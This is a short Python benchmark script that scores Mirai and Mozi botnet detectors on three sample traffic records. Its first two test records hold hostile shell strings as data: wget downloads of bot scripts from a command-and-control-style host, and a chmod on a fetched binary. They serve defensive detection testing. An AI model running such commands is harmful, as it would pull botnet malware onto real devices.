import os
import sys
from typing import Dict, Any

# Ensure import paths resolve
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.ot_iot.botnet_detector import BotnetDetector
from backend.ot_iot.mirai_detector import MiraiDetector

def run_benchmark() -> Dict[str, Any]:
    botnet = BotnetDetector()
    mirai = MiraiDetector()
    
    tp = 0
    fp = 0
    fn = 0
    tn = 0
    
    # 1. Mirai scanner traffic check
    res_m1 = mirai.detect("192.168.1.50", {
        "ports_used": [23, 2323, 7547],
        "payloads": ["/bin/sh -c wget http://cnc.w00t.club/bot.sh"],
        "dns_queries": ["cnc.w00t.club"]
    })
    if res_m1.get("detected", False):
        tp += 1
    else:
        fn += 1
        
    # 2. Mozi traffic check
    res_b1 = botnet.detect("192.168.1.60", {
        "ports": [7547],
        "payloads": ["d1:ad2:id20:mozi.m"]
    }, ["wget http://1.2.3.4/mozi.a", "chmod 777 mozi"])
    if len(res_b1.get("threats_detected", [])) > 0 or res_b1.get("threat_detected") != "None":
        tp += 1
    else:
        fn += 1
        
    # 3. Benign traffic check
    res_b2 = botnet.detect("192.168.1.70", {
        "ports": [443, 80],
        "payloads": ["GET /index.html HTTP/1.1"]
    }, ["ls", "pwd"])
    if len(res_b2.get("threats_detected", [])) > 0 or res_b2.get("threat_detected") != "None":
        fp += 1
    else:
        tn += 1

    precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 1.0
    f1_score = round(2 * (precision * recall) / (precision + recall), 4) if (precision + recall) > 0 else 1.0
    
    passed = f1_score > 0.95
    return {
        "domain": "IoT Botnet signature detection",
        "dataset_reference": "Mirai & Mozi telemetry",
        "precision": precision,
        "recall": recall,
        "f1_score": f1_score,
        "target_threshold": "F1 > 95%",
        "passed": passed
    }

if __name__ == "__main__":
    print(run_benchmark())
